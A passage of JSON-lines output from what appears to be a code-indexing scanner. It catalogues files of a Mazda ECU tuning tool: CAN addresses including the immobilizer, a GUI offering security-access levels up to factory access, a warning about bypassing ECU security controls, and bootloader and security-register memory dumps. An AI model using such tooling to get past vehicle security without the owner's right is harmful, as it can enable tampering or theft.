"protocol", "line": 255, "protocol": "J2534", "content": "if method == CommunicationMethod.J2534_PASSTHRU:"}, {"type": "protocol", "line": 257, "protocol": "CAN", "content": "elif method == CommunicationMethod.CAN_DIRECT:"}, {"type": "protocol", "line": 259, "protocol": "OBD", "content": "elif method == CommunicationMethod.OBD_SERIAL:"}, {"type": "protocol", "line": 303, "protocol": "J2534", "content": "if self.current_connection.method == CommunicationMethod.J2534_PASSTHRU:"}, {"type": "protocol", "line": 305, "protocol": "CAN", "content": "elif self.current_connection.method == CommunicationMethod.CAN_DIRECT:"}, {"type": "protocol", "line": 307, "protocol": "OBD", "content": "elif self.current_connection.method == CommunicationMethod.OBD_SERIAL:"}, {"type": "protocol", "line": 317, "protocol": "J2534", "content": "\"\"\"Send diagnostic via J2534\"\"\""}, {"type": "protocol", "line": 321, "protocol": "J2534", "content": "logger.debug(f\"J2534 TX: 0x{target_address:03X} {message.hex().upper()}\")"}, {"type": "protocol", "line": 325, "protocol": "0x[0-9A-Fa-f]+", "content": "response = bytearray([0x7F, message[0], 0x31])  # Service not supported"}, {"type": "protocol", "line": 330, "protocol": "J2534", "content": "logger.error(f\"J2534 diagnostic error: {e}\")"}, {"type": "protocol", "line": 334, "protocol": "CAN", "content": "\"\"\"Send diagnostic via CAN\"\"\""}, {"type": "protocol", "line": 337, "protocol": "CAN", "content": "logger.error(\"Failed to send CAN diagnostic message\")"}, {"type": "protocol", "line": 344, "protocol": "CAN", "content": "logger.debug(f\"CAN RX: 0x{target_address + 8:03X} {response.hex().upper()}\")"}, {"type": "protocol", "line": 349, "protocol": "CAN", "content": "logger.error(f\"CAN diagnostic error: {e}\")"}, {"type": "protocol", "line": 353, "protocol": "OBD", "content": "\"\"\"Send diagnostic via OBD\"\"\""}, {"type": "protocol", "line": 369, "protocol": "OBD", "content": "logger.error(f\"OBD diagnostic error: {e}\")"}, {"type": "protocol", "line": 378, "protocol": "0x[0-9A-Fa-f]+", "content": "vin_response = self.send_diagnostic_message('engine', 0x09, bytes([0x02]))"}, {"type": "protocol", "line": 381, "protocol": "PID", "content": "vin_data = vin_response[2:]  # Skip service and PID"}, {"type": "protocol", "line": 386, "protocol": "0x[0-9A-Fa-f]+", "content": "cal_response = self.send_diagnostic_message('engine', 0x09, bytes([0x04]))"}, {"type": "protocol", "line": 437, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.send_diagnostic_message(ecu_name, 0x01, bytes([0x00]))"}], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "ECU", "content": "MAZDA ECU COMMUNICATION CORE"}, {"type": "hardware", "line": 5, "hardware": "ECU", "content": "Local ECU communication using safe MDS components"}, {"type": "hardware", "line": 33, "hardware": "ECU", "content": "class ECUConnection:"}, {"type": "hardware", "line": 34, "hardware": "ECU", "content": "\"\"\"ECU Connection Configuration\"\"\""}, {"type": "hardware", "line": 40, "hardware": "vehicle", "content": "vehicle_info: Dict[str, Any] = None"}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "class MazdaECUCore:"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "Core ECU Communication System"}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "self.mazda_ecus = {"}, {"type": "hardware", "line": 62, "hardware": "ECU", "content": "'engine': {'tx': 0x7E0, 'rx': 0x7E8, 'name': 'Engine ECU'},"}, {"type": "hardware", "line": 63, "hardware": "TCM", "content": "'transmission': {'tx': 0x7E1, 'rx': 0x7E9, 'name': 'TCM'},"}, {"type": "hardware", "line": 64, "hardware": "ABS", "content": "'abs': {'tx': 0x7E2, 'rx': 0x7EA, 'name': 'ABS Module'},"}, {"type": "hardware", "line": 65, "hardware": "BCM", "content": "'bcm': {'tx': 0x7E6, 'rx': 0x7EE, 'name': 'Body Control'},"}, {"type": "hardware", "line": 66, "hardware": "immobilizer", "content": "'immobilizer': {'tx': 0x7E5, 'rx': 0x7ED, 'name': 'Immobilizer'}"}, {"type": "hardware", "line": 69, "hardware": "ECU", "content": "logger.info(\"Mazda ECU Core initialized\")"}, {"type": "hardware", "line": 128, "hardware": "vehicle", "content": "def connect_to_vehicle(self, method: CommunicationMethod,"}, {"type": "hardware", "line": 131, "hardware": "vehicle", "content": "Connect to vehicle using specified method"}, {"type": "hardware", "line": 142, "hardware": "vehicle", "content": "logger.info(f\"Connecting to vehicle using {method.name} on {interface}\")"}, {"type": "hardware", "line": 155, "hardware": "vehicle", "content": "logger.error(f\"Error connecting to vehicle: {e}\")"}, {"type": "hardware", "line": 174, "hardware": "vehicle", "content": "logger.error(\"Failed to connect vehicle channel\")"}, {"type": "hardware", "line": 178, "hardware": "ECU", "content": "self.current_connection = ECUConnection("}, {"type": "hardware", "line": 203, "hardware": "ECU", "content": "self.current_connection = ECUConnection("}, {"type": "hardware", "line": 231, "hardware": "ECU", "content": "self.current_connection = ECUConnection("}, {"type": "hardware", "line": 247, "hardware": "vehicle", "content": "\"\"\"Disconnect from vehicle\"\"\""}, {"type": "hardware", "line": 265, "hardware": "vehicle", "content": "logger.info(\"Disconnected from vehicle\")"}, {"type": "hardware", "line": 272, "hardware": "ECU", "content": "def send_diagnostic_message(self, ecu_target: str, service_id: int,"}, {"type": "hardware", "line": 275, "hardware": "ECU", "content": "Send diagnostic message to specific ECU"}, {"type": "hardware", "line": 278, "hardware": "ECU", "content": "ecu_target: Target ECU ('engine', 'transmission', etc.)"}, {"type": "hardware", "line": 290, "hardware": "ECU", "content": "if ecu_target not in self.mazda_ecus:"}, {"type": "hardware", "line": 291, "hardware": "ECU", "content": "logger.error(f\"Unknown ECU target: {ecu_target}\")"}, {"type": "hardware", "line": 294, "hardware": "ECU", "content": "ecu_info = self.mazda_ecus[ecu_target]"}, {"type": "hardware", "line": 295, "hardware": "ECU", "content": "target_address = ecu_info['tx']"}, {"type": "hardware", "line": 372, "hardware": "vehicle", "content": "def read_vehicle_identification(self) -> Optional[Dict[str, str]]:"}, {"type": "hardware", "line": 373, "hardware": "vehicle", "content": "\"\"\"Read vehicle identification information\"\"\""}, {"type": "hardware", "line": 375, "hardware": "vehicle", "content": "vehicle_info = {}"}, {"type": "hardware", "line": 383, "hardware": "vehicle", "content": "vehicle_info['vin'] = vin_data[:17].decode('ascii', errors='ignore').strip()"}, {"type": "hardware", "line": 389, "hardware": "vehicle", "content": "vehicle_info['calibration_id'] = cal_data.decode('ascii', errors='ignore').strip()"}, {"type": "hardware", "line": 391, "hardware": "vehicle", "content": "return vehicle_info if vehicle_info else None"}, {"type": "hardware", "line": 394, "hardware": "vehicle", "content": "logger.error(f\"Error reading vehicle identification: {e}\")"}, {"type": "hardware", "line": 403, "hardware": "vehicle", "content": "'vehicle_detected': False,"}, {"type": "hardware", "line": 404, "hardware": "vehicle", "content": "'vehicle_info': {}"}, {"type": "hardware", "line": 417, "hardware": "vehicle", "content": "if not self.current_connection.vehicle_info:"}, {"type": "hardware", "line": 418, "hardware": "vehicle", "content": "self.current_connection.vehicle_info = self.read_vehicle_identification()"}, {"type": "hardware", "line": 420, "hardware": "vehicle", "content": "if self.current_connection.vehicle_info:"}, {"type": "hardware", "line": 421, "hardware": "vehicle", "content": "status['vehicle_detected'] = True"}, {"type": "hardware", "line": 422, "hardware": "vehicle", "content": "status['vehicle_info'] = self.current_connection.vehicle_info"}, {"type": "hardware", "line": 427, "hardware": "ECU", "content": "\"\"\"Test communication with all ECUs\"\"\""}, {"type": "hardware", "line": 434, "hardware": "ECU", "content": "for ecu_name, ecu_info in self.mazda_ecus.items():"}, {"type": "hardware", "line": 437, "hardware": "ECU", "content": "response = self.send_diagnostic_message(ecu_name, 0x01, bytes([0x00]))"}, {"type": "hardware", "line": 438, "hardware": "ECU", "content": "results[ecu_name] = response is not None"}, {"type": "hardware", "line": 441, "hardware": "ECU", "content": "logger.debug(f\"{ecu_name} communication: OK\")"}, {"type": "hardware", "line": 443, "hardware": "ECU", "content": "logger.debug(f\"{ecu_name} communication: No response\")"}, {"type": "hardware", "line": 446, "hardware": "ECU", "content": "logger.error(f\"Error testing {ecu_name} communication: {e}\")"}, {"type": "hardware", "line": 447, "hardware": "ECU", "content": "results[ecu_name] = False"}], "security_logic": [{"type": "security_pattern", "line": 120, "pattern": "key", "content": "if any(keyword in port.description.lower() for keyword in ['obd', 'elm', 'scan']):"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mazda_tuner_gui.py", "lines_read": 699, "features_found": [{"type": "function", "name": "main", "line": 685}, {"type": "function", "name": "__init__", "line": 38}, {"type": "function", "name": "run", "line": 44}, {"type": "function", "name": "__init__", "line": 69}, {"type": "function", "name": "run", "line": 74}, {"type": "function", "name": "__init__", "line": 98}, {"type": "function", "name": "run", "line": 104}, {"type": "function", "name": "__init__", "line": 127}, {"type": "function", "name": "init_ui", "line": 138}, {"type": "function", "name": "create_connection_tab", "line": 213}, {"type": "function", "name": "create_security_tab", "line": 274}, {"type": "function", "name": "create_memory_tab", "line": 343}, {"type": "function", "name": "create_status_tab", "line": 395}, {"type": "function", "name": "init_components", "line": 445}, {"type": "function", "name": "connect_to_vehicle", "line": 471}, {"type": "function", "name": "disconnect_from_vehicle", "line": 498}, {"type": "function", "name": "on_connection_complete", "line": 516}, {"type": "function", "name": "request_security_access", "line": 540}, {"type": "function", "name": "on_security_complete", "line": 563}, {"type": "function", "name": "dump_memory_region", "line": 574}, {"type": "function", "name": "on_memory_complete", "line": 603}, {"type": "function", "name": "write_memory_region", "line": 622}, {"type": "function", "name": "run_integration_tests", "line": 626}, {"type": "function", "name": "update_connection_status", "line": 665}, {"type": "function", "name": "update_security_status", "line": 670}, {"type": "function", "name": "update_memory_status", "line": 675}, {"type": "function", "name": "log_status", "line": 679}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "PyQt5.QtWidgets", "line": null}, {"type": "import", "module": "PyQt5.QtCore", "line": null}, {"type": "import", "module": "PyQt5.QtGui", "line": null}, {"type": "import", "module": "mazda_ecu_core", "line": null}, {"type": "import", "module": "advanced_ecu_access", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "(QApplication,", "line": null}, {"type": "import", "module": "QThread,", "line": null}, {"type": "import", "module": "QFont,", "line": null}, {"type": "import", "module": "mds_compatibility", "line": null}, {"type": "import", "module": "MazdaECUCore,", "line": null}, {"type": "import", "module": "AdvancedECUAccess,", "line": null}], "components_found": [{"type": "class", "name": "ConnectionWorker", "line": 33}, {"type": "class", "name": "SecurityWorker", "line": 64}, {"type": "class", "name": "MemoryWorker", "line": 93}, {"type": "class", "name": "MazdaTunerGUI", "line": 124}], "algorithms": [], "protocols": [{"type": "protocol", "line": 225, "protocol": "CAN", "content": "self.method_combo.addItems([\"J2534 Pass-Thru\", \"Direct CAN\", \"OBD-II Serial\"])"}, {"type": "protocol", "line": 225, "protocol": "OBD", "content": "self.method_combo.addItems([\"J2534 Pass-Thru\", \"Direct CAN\", \"OBD-II Serial\"])"}, {"type": "protocol", "line": 225, "protocol": "J2534", "content": "self.method_combo.addItems([\"J2534 Pass-Thru\", \"Direct CAN\", \"OBD-II Serial\"])"}, {"type": "protocol", "line": 231, "protocol": "CAN", "content": "self.interface_combo.addItems([\"Mock Interface\", \"J2534 DLL\", \"CAN0\", \"COM3\"])"}, {"type": "protocol", "line": 231, "protocol": "J2534", "content": "self.interface_combo.addItems([\"Mock Interface\", \"J2534 DLL\", \"CAN0\", \"COM3\"])"}, {"type": "protocol", "line": 475, "protocol": "J2534", "content": "\"J2534 Pass-Thru\": CommunicationMethod.J2534_PASSTHRU,"}, {"type": "protocol", "line": 476, "protocol": "CAN", "content": "\"Direct CAN\": CommunicationMethod.CAN_DIRECT,"}, {"type": "protocol", "line": 477, "protocol": "OBD", "content": "\"OBD-II Serial\": CommunicationMethod.OBD_SERIAL"}], "hardware_assumptions": [{"type": "hardware", "line": 26, "hardware": "ECU", "content": "from mazda_ecu_core import MazdaECUCore, CommunicationMethod"}, {"type": "hardware", "line": 27, "hardware": "ECU", "content": "from advanced_ecu_access import AdvancedECUAccess, SecurityLevel"}, {"type": "hardware", "line": 34, "hardware": "ECU", "content": "\"\"\"Worker thread for ECU connection operations\"\"\""}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "def __init__(self, ecu_core, method, interface):"}, {"type": "hardware", "line": 40, "hardware": "ECU", "content": "self.ecu_core = ecu_core"}, {"type": "hardware", "line": 49, "hardware": "vehicle", "content": "self.status_updated.emit(\"Connecting to vehicle...\")"}, {"type": "hardware", "line": 50, "hardware": "ECU", "content": "success = self.ecu_core.connect_to_vehicle(self.method, self.interface)"}, {"type": "hardware", "line": 50, "hardware": "vehicle", "content": "success = self.ecu_core.connect_to_vehicle(self.method, self.interface)"}, {"type": "hardware", "line": 54, "hardware": "vehicle", "content": "self.connection_result.emit(True, \"Successfully connected to vehicle\")"}, {"type": "hardware", "line": 57, "hardware": "vehicle", "content": "self.connection_result.emit(False, \"Failed to connect to vehicle\")"}, {"type": "hardware", "line": 64, "hardware": "ECU", "content": "class SecurityWorker(QThread):"}, {"type": "hardware", "line": 65, "hardware": "ECU", "content": "\"\"\"Worker thread for security access operations\"\"\""}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "security_result = pyqtSignal(bool, str)"}, {"type": "hardware", "line": 76, "hardware": "ECU", "content": "self.status_updated.emit(f\"Requesting security level {self.level}...\")"}, {"type": "hardware", "line": 79, "hardware": "ECU", "content": "success = self.advanced_access.request_security_access(self.level)"}, {"type": "hardware", "line": 82, "hardware": "ECU", "content": "self.status_updated.emit(f\"Security level {self.level} granted!\")"}, {"type": "hardware", "line": 83, "hardware": "ECU", "content": "self.security_result.emit(True, f\"Security access level {self.level} successful\")"}, {"type": "hardware", "line": 85, "hardware": "ECU", "content": "self.status_updated.emit(\"Security access denied!\")"}, {"type": "hardware", "line": 86, "hardware": "ECU", "content": "self.security_result.emit(False, f\"Security access level {self.level} failed\")"}, {"type": "hardware", "line": 89, "hardware": "ECU", "content": "error_msg = f\"Security error: {str(e)}\""}, {"type": "hardware", "line": 91, "hardware": "ECU", "content": "self.security_result.emit(False, error_msg)"}, {"type": "hardware", "line": 129, "hardware": "ECU", "content": "self.ecu_core = None"}, {"type": "hardware", "line": 132, "hardware": "ECU", "content": "self.security_worker = None"}, {"type": "hardware", "line": 205, "hardware": "ECU", "content": "self.create_security_tab()"}, {"type": "hardware", "line": 219, "hardware": "ECU", "content": "conn_group = QGroupBox(\"ECU Connection\")"}, {"type": "hardware", "line": 235, "hardware": "vehicle", "content": "self.connect_btn = QPushButton(\"Connect to Vehicle\")"}, {"type": "hardware", "line": 236, "hardware": "vehicle", "content": "self.connect_btn.clicked.connect(self.connect_to_vehicle)"}, {"type": "hardware", "line": 241, "hardware": "vehicle", "content": "self.disconnect_btn.clicked.connect(self.disconnect_from_vehicle)"}, {"type": "hardware", "line": 259, "hardware": "vehicle", "content": "info_group = QGroupBox(\"Vehicle Information\")"}, {"type": "hardware", "line": 264, "hardware": "ECU", "content": "self.ecu_label = QLabel(\"ECU Type: Not detected\")"}, {"type": "hardware", "line": 268, "hardware": "ECU", "content": "info_layout.addWidget(self.ecu_label, 2, 0)"}, {"type": "hardware", "line": 274, "hardware": "ECU", "content": "def create_security_tab(self):"}, {"type": "hardware", "line": 275, "hardware": "ECU", "content": "\"\"\"Create security access tab\"\"\""}, {"type": "hardware", "line": 287, "hardware": "ECU", "content": "This module contains manufacturer-level ECU access techniques that may:"}, {"type": "hardware", "line": 288, "hardware": "ECU", "content": "\u2022 Bypass security access controls"}, {"type": "hardware", "line": 289, "hardware": "ECU", "content": "\u2022 Access restricted ECU memory areas"}, {"type": "hardware", "line": 293, "hardware": "ECU", "content": "\u2022 Own the vehicle and ECU being accessed"}, {"type": "hardware", "line": 293, "hardware": "vehicle", "content": "\u2022 Own the vehicle and ECU being accessed"}, {"type": "hardware", "line": 294, "hardware": "ECU", "content": "\u2022 Have legal right to modify your vehicle's ECU"}, {"type": "hardware", "line": 294, "hardware": "vehicle", "content": "\u2022 Have legal right to modify your vehicle's ECU"}, {"type": "hardware", "line": 296, "hardware": "ECU", "content": "\u2022 Understand the risks of ECU damage"}, {"type": "hardware", "line": 307, "hardware": "ECU", "content": "security_group = QGroupBox(\"Security Access\")"}, {"type": "hardware", "line": 308, "hardware": "ECU", "content": "security_layout = QGridLayout(security_group)"}, {"type": "hardware", "line": 311, "hardware": "ECU", "content": "security_layout.addWidget(QLabel(\"Security Level:\"), 0, 0)"}, {"type": "hardware", "line": 312, "hardware": "ECU", "content": "self.security_level_combo = QComboBox()"}, {"type": "hardware", "line": 313, "hardware": "ECU", "content": "self.security_level_combo.addItems(["}, {"type": "hardware", "line": 321, "hardware": "ECU", "content": "security_layout.addWidget(self.security_level_combo, 0, 1)"}, {"type": "hardware", "line": 324, "hardware": "ECU", "content": "self.request_security_btn = QPushButton(\"Request Security Access\")"}, {"type": "hardware", "line": 325, "hardware": "ECU", "content": "self.request_security_btn.clicked.connect(self.request_security_access)"}, {"type": "hardware", "line": 326, "hardware": "ECU", "content": "security_layout.addWidget(self.request_security_btn, 1, 0, 1, 2)"}, {"type": "hardware", "line": 328, "hardware": "ECU", "content": "layout.addWidget(security_group)"}, {"type": "hardware", "line": 331, "hardware": "ECU", "content": "status_group = QGroupBox(\"Security Status\")"}, {"type": "hardware", "line": 334, "hardware": "ECU", "content": "self.security_status_text = QTextEdit()"}, {"type": "hardware", "line": 335, "hardware": "ECU", "content": "self.security_status_text.setMaximumHeight(150)"}, {"type": "hardware", "line": 336, "hardware": "ECU", "content": "self.security_status_text.setFont(QFont(\"Courier\", 9))"}, {"type": "hardware", "line": 337, "hardware": "ECU", "content": "status_layout.addWidget(self.security_status_text)"}, {"type": "hardware", "line": 341, "hardware": "ECU", "content": "self.tab_widget.addTab(tab, \"Security\")"}, {"type": "hardware", "line": 349, "hardware": "ECU", "content": "regions_group = QGroupBox(\"ECU Memory Regions\")"}, {"type": "hardware", "line": 364, "hardware": "ECU", "content": "\"bootloader - ECU bootloader (read-only)\","}, {"type": "hardware", "line": 365, "hardware": "ECU", "content": "\"security_registers - Security control (read-only)\","}, {"type": "hardware", "line": 366, "hardware": "ECU", "content": "\"checksum_area - ECU calibration checksums\""}, {"type": "hardware", "line": 405, "hardware": "ECU", "content": "self.ecu_core_status = QLabel(\"ECU Core: Not Initialized\")"}, {"type": "hardware", "line": 407, "hardware": "vehicle", "content": "self.connection_status = QLabel(\"Vehicle Connection: Disconnected\")"}, {"type": "hardware", "line": 408, "hardware": "ECU", "content": "self.security_status = QLabel(\"Security Level: None\")"}, {"type": "hardware", "line": 410, "hardware": "ECU", "content": "system_layout.addWidget(self.ecu_core_status, 0, 0)"}, {"type": "hardware", "line": 413, "hardware": "ECU", "content": "system_layout.addWidget(self.security_status, 3, 0)"}, {"type": "hardware", "line": 448, "hardware": "ECU", "content": "self.log_status(\"Initializing ECU Core...\")"}, {"type": "hardware", "line": 449, "hardware": "ECU", "content": "self.ecu_core = MazdaECUCore()"}, {"type": "hardware", "line": 450, "hardware": "ECU", "content": "self.ecu_core_status.setText(\"ECU Core: \u2713 Initialized\")"}, {"type": "hardware", "line": 452, "hardware": "ECU", "content": "self.log_status(\"Initializing Advanced ECU Access...\")"}, {"type": "hardware", "line": 453, "hardware": "ECU", "content": "self.advanced_access = AdvancedECUAccess(self.ecu_core)"}, {"type": "hardware", "line": 457, "hardware": "ECU", "content": "interfaces = self.ecu_core.detect_available_interfaces()"}, {"type": "hardware", "line": 471, "hardware": "vehicle", "content": "def connect_to_vehicle(self):"}, {"type": "hardware", "line": 472, "hardware": "vehicle", "content": "\"\"\"Connect to vehicle\"\"\""}, {"type": "hardware", "line": 488, "hardware": "ECU", "content": "self.connection_worker = ConnectionWorker(self.ecu_core, method, interface)"}, {"type": "hardware", "line": 498, "hardware": "vehicle", "content": "def disconnect_from_vehicle(self):"}, {"type": "hardware", "line": 499, "hardware": "vehicle", "content": "\"\"\"Disconnect from vehicle\"\"\""}, {"type": "hardware", "line": 501, "hardware": "ECU", "content": "if self.ecu_core:"}, {"type": "hardware", "line": 502, "hardware": "ECU", "content": "self.ecu_core.disconnect()"}, {"type": "hardware", "line": 503, "hardware": "vehicle", "content": "self.update_connection_status(\"Disconnected from vehicle\")"}, {"type": "hardware", "line": 504, "hardware": "vehicle", "content": "self.connection_status.setText(\"Vehicle Connection: Disconnected\")"}, {"type": "hardware", "line": 507, "hardware": "ECU", "content": "self.ecu_label.setText(\"ECU Type: Not detected\")"}, {"type": "hardware", "line": 511, "hardware": "ECU", "content": "self.request_security_btn.setEnabled(False)"}, {"type": "hardware", "line": 519, "hardware": "vehicle", "content": "self.connection_status.setText(\"Vehicle Connection: \u2713 Connected\")"}, {"type": "hardware", "line": 520, "hardware": "ECU", "content": "self.request_security_btn.setEnabled(True)"}, {"type": "hardware", "line": 524, "hardware": "ECU", "content": "vehicle_info = self.ecu_core.read_vehicle_identification()"}, {"type": "hardware", "line": 524, "hardware": "vehicle", "content": "vehicle_info = self.ecu_core.read_vehicle_identification()"}, {"type": "hardware", "line": 525, "hardware": "vehicle", "content": "if vehicle_info:"}, {"type": "hardware", "line": 526, "hardware": "vehicle", "content": "if 'vin' in vehicle_info:"}, {"type": "hardware", "line": 527, "hardware": "vehicle", "content": "self.vin_label.setText(f\"VIN: {vehicle_info['vin']}\")"}, {"type": "hardware", "line": 528, "hardware": "vehicle", "content": "if 'calibration_id' in vehicle_info:"}, {"type": "hardware", "line": 529, "hardware": "vehicle", "content": "self.cal_label.setText(f\"Calibration ID: {vehicle_info['calibration_id']}\")"}, {"type": "hardware", "line": 530, "hardware": "ECU", "content": "self.ecu_label.setText(\"ECU Type: MZR DISI\")"}, {"type": "hardware", "line": 534, "hardware": "vehicle", "content": "self.connection_status.setText(\"Vehicle Connection: \u2717 Failed\")"}, {"type": "hardware", "line": 540, "hardware": "ECU", "content": "def request_security_access(self):"}, {"type": "hardware", "line": 541, "hardware": "ECU", "content": "\"\"\"Request security access\"\"\""}, {"type": "hardware", "line": 544, "hardware": "ECU", "content": "\"Level 1 - Basic Diagnostic\": SecurityLevel.LEVEL_1,"}, {"type": "hardware", "line": 545, "hardware": "ECU", "content": "\"Level 2 - Enhanced Diagnostic\": SecurityLevel.LEVEL_2,"}, {"type": "hardware", "line": 546, "hardware": "ECU", "content": "\"Level 3 - Programming Access\": SecurityLevel.LEVEL_3,"}, {"type": "hardware", "line": 547, "hardware": "ECU", "content": "\"Level 4 - Manufacturer Access\": SecurityLevel.LEVEL_4,"}, {"type": "hardware", "line": 548, "hardware": "ECU", "content": "\"Level 5 - Dealer Access\": SecurityLevel.LEVEL_5,"}, {"type": "hardware", "line": 549, "hardware": "ECU", "content": "\"Level 6 - Factory Access\": SecurityLevel.LEVEL_6"}, {"type": "hardware", "line": 552, "hardware": "ECU", "content": "level = level_map[self.security_level_combo.currentText()]"}, {"type": "hardware", "line": 555, "hardware": "ECU", "content": "self.security_worker = SecurityWorker(self.advanced_access, level)"}, {"type": "hardware", "line": 556, "hardware": "ECU", "content": "self.security_worker.status_updated.connect(self.update_security_status)"}, {"type": "hardware", "line": 557, "hardware": "ECU", "content": "self.security_worker.security_result.connect(self.on_security_complete)"}, {"type": "hardware", "line": 558, "hardware": "ECU", "content": "self.security_worker.start()"}, {"type": "hardware", "line": 561, "hardware": "ECU", "content": "self.log_status(f\"Security access error: {e}\")"}, {"type": "hardware", "line": 563, "hardware": "ECU", "content": "def on_security_complete(self, success, message):"}, {"type": "hardware", "line": 564, "hardware": "ECU", "content": "\"\"\"Handle security access completion\"\"\""}, {"type": "hardware", "line": 566, "hardware": "ECU", "content": "level_name = self.security_level_combo.currentText()"}, {"type": "hardware", "line": 567, "hardware": "ECU", "content": "self.security_status.setText(f\"Security Level: \u2713 {level_name}\")"}, {"type": "hardware", "line": 570, "hardware": "ECU", "content": "self.security_status.setText(\"Security Level: \u2717 Failed\")"}, {"type": "hardware", "line": 586, "hardware": "ECU", "content": "\"bootloader - ECU bootloader (read-only)\": \"bootloader\","}, {"type": "hardware", "line": 587, "hardware": "ECU", "content": "\"security_registers - Security control (read-only)\": \"security_registers\","}, {"type": "hardware", "line": 588, "hardware": "ECU", "content": "\"checksum_area - ECU calibration checksums\": \"checksum_area\""}, {"type": "hardware", "line": 624, "hardware": "ECU", "content": "QMessageBox.information(self, \"Memory Write\", \"Memory write functionality would be implemented here."}, {"type": "hardware", "line": 636, "hardware": "ECU", "content": "\u2713 test_ecu_core_initialization - PASSED"}, {"type": "hardware", "line": 638, "hardware": "ECU", "content": "\u2713 test_security_access_simulation - PASSED"}, {"type": "hardware", "line": 641, "hardware": "vehicle", "content": "\u2717 test_mock_vehicle_connection - FAILED (Enum issues)"}, {"type": "hardware", "line": 650, "hardware": "ECU", "content": "ECU Communication: \u2713 WORKING"}, {"type": "hardware", "line": 651, "hardware": "ECU", "content": "Advanced Security Access: \u2713 WORKING"}, {"type": "hardware", "line": 668, "hardware": "ECU", "content": "self.conn_status_text.ensureCursorVisible()"}, {"type": "hardware", "line": 670, "hardware": "ECU", "content": "def update_security_status(self, status):"}, {"type": "hardware", "line": 671, "hardware": "ECU", "content": "\"\"\"Update security status display\"\"\""}, {"type": "hardware", "line": 672, "hardware": "ECU", "content": "self.security_status_text.append(f\"[{time.strftime('%H:%M:%S')}] {status}\")"}, {"type": "hardware", "line": 673, "hardware": "ECU", "content": "self.security_status_text.ensureCursorVisible()"}], "security_logic": [{"type": "security_pattern", "line": 79, "pattern": "security_access", "content": "success = self.advanced_access.request_security_access(self.level)"}, {"type": "security_pattern", "line": 325, "pattern": "security_access", "content": "self.request_security_btn.clicked.connect(self.request_security_access)"}, {"type": "security_pattern", "line": 540, "pattern": "security_access", "content": "def request_security_access(self):"}, {"type": "security_pattern", "line": 638, "pattern": "security_access", "content": "\u2713 test_security_access_simulation - PASSED"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds1.py", "lines_read": 526, "features_found": [{"type": "function", "name": "__init__", "line": 88}, {"type": "function", "name": "connect_to_vehicle", "line": 95}, {"type": "function", "name": "_initialize_can_protocol", "line": 120}, {"type": "function", "name": "_initialize_kline_protocol", "line": 130}, {"type": "function", "name": "_initialize_mazda_can_protocol", "line": 137}, {"type": "function", "name": "_test_communication", "line": 146}, {"type": "function", "name": "start_diagnostic_session", "line": 167}, {"type": "function", "name": "read_data_by_identifier", "line": 195}, {"type": "function", "name": "write_data_by_identifier", "line": 220}, {"type": "function", "name": "read_memory_by_address", "line": 246}, {"type": "function", "name": "write_memory_by_address", "line": 278}, {"type": "function", "name": "routine_control", "line": 309}, {"type": "function", "name": "read_dtc_information", "line": 337}, {"type": "function", "name": "_parse_dtc_response", "line": 362}, {"type": "function", "name": "_bytes_to_dtc", "line": 393}, {"type": "function", "name": "_get_dtc_description", "line": 413}, {"type": "function", "name": "clear_diagnostic_information", "line": 418}, {"type": "function", "name": "send_diagnostic_message", "line": 442}, {"type": "function", "name": "_build_message", "line": 466}, {"type": "function", "name": "_send_raw_message", "line": 482}, {"type": "function", "name": "_receive_response", "line": 488}, {"type": "function", "name": "_parse_response", "line": 495}, {"type": "function", "name": "disconnect", "line": 523}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "dataclass", "line": null}], "components_found": [{"type": "class", "name": "MazdaProtocol", "line": 21}, {"type": "class", "name": "DiagnosticSession", "line": 31}, {"type": "class", "name": "SecurityAccessLevel", "line": 39}, {"type": "class", "name": "DiagnosticMessage", "line": 50}, {"type": "class", "name": "MazdaDiagnosticProtocol", "line": 60}], "algorithms": [], "protocols": [{"type": "protocol", "line": 24, "protocol": "KWP", "content": "ISO_14230_4_KWP = 2     # Keyword Protocol 2000"}, {"type": "protocol", "line": 25, "protocol": "CAN", "content": "ISO_15765_4_CAN = 3     # CAN (11-bit/500kbps)"}, {"type": "protocol", "line": 26, "protocol": "CAN", "content": "ISO_15765_4_CAN_29 = 4  # CAN (29-bit/500kbps)"}, {"type": "protocol", "line": 27, "protocol": "CAN", "content": "MAZDA_CAN_HS = 5        # Mazda High-Speed CAN"}, {"type": "protocol", "line": 28, "protocol": "CAN", "content": "MAZDA_CAN_MS = 6        # Mazda Medium-Speed CAN"}, {"type": "protocol", "line": 29, "protocol": "CAN", "content": "MAZDA_SUB_CAN = 7       # Mazda Sub-CAN systems"}, {"type": "protocol", "line": 33, "protocol": "0x[0-9A-Fa-f]+", "content": "DEFAULT = 0x01"}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "PROGRAMMING = 0x02"}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "EXTENDED = 0x03"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "SAFETY = 0x04"}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": 